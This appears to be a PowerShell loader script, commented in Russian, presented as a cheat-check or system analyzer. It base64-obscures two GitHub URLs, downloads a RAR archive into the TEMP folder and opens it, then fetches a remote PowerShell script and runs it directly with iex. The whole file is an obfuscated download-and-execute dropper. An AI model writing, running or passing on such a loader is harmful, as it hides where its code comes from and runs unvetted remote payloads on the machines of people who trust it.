# combined_loader.ps1
$rarUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL0NoZWF0Q2hlY2tObzk4MjM3L2ZyYXBwZXIvcmF3L3JlZnMvaGVhZHMvbWFpbi9wcm9ncmFtcy5yYXI='))
$rarPath = "$env:TEMP\p.rar"
$psUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NoZWF0Q2hlY2tObzk4MjM3L2NoZWNrZXIvcmVmcy9oZWFkcy9tYWluL3N5c19hbmFseXplci5wczE='))

# Скачиваем и открываем RAR
(New-Object Net.WebClient).DownloadFile($rarUrl, $rarPath)
Invoke-Item $rarPath

# Загружаем и выполняем анализатор
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex (Invoke-WebRequest -Uri $psUrl -UseBasicParsing).Content